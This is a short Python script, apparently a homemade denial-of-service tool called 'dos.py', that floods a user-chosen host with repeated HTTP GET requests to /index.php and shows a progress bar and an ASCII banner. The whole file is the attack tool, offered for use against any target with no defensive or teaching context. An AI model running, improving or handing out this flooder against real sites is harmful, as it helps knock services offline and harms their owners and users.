import argparse
import httplib
import time
import sys
from progress.bar import Bar


def banner():
    print ('''
**************************************************************************************************************************    
*.----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  *
*| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |*
*| | ____    ____ | || |     _____    | || |  ___  ____   | || |  _________   | || |   _____      | || |      __      | |*
*| ||_   \  /   _|| || |    |_   _|   | || | |_  ||_  _|  | || | |_   ___  |  | || |  |_   _|     | || |     /  \     | |*
*| |  |   \/   |  | || |      | |     | || |   | |_/ /    | || |   | |_  \_|  | || |    | |       | || |    / /\ \    | |*
*| |  | |\  /| |  | || |      | |     | || |   |  __'.    | || |   |  _|  _   | || |    | |   _   | || |   / ____ \   | |*
*| | _| |_\/_| |_ | || |     _| |_    | || |  _| |  \ \_  | || |  _| |___/ |  | || |   _| |__/ |  | || | _/ /    \ \_ | |*
*| ||_____||_____|| || |    |_____|   | || | |____||____| | || | |_________|  | || |  |________|  | || ||____|  |____|| |*
*| |              | || |              | || |              | || |              | || |              | || |              | |*
*| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |*
*'----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' |*''')
    time.sleep(1)
    print ('''
*                                                                               BY: ElaSec | Mikili                      *
**************************************************************************************************************************
 ''')


def setconnect(t, n):
    try:
        bar = Bar('Sending request',max = int(n))
        for i in range(1, int(n)):
            httpconnection = httplib.HTTPConnection(t, 80)
            httpconnection.request("GET", "/index.php")
            bar.next()
        else:
            print('\r\n -------- send {0} request to target {1} -------- '.format(n, t))
            bar.finish()
    except:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target")
    parser.add_argument("-n", "--count")
    args = parser.parse_args()
    if not args.target or not args.count:
        print (' ')
        print('  Usage: ./dos.py [options]')
        print(' ')
        print('  Options: -t, --target    <hostname>   |   Target')
        print('           -n, --count     <connection times>|   Counts')
        print(' ')
        print('  Example: ./dos.py -t www.test.com -n 100 ')
        sys.exit(0)
    banner()
    target = args.target
    count = args.count
    setconnect(target, count)

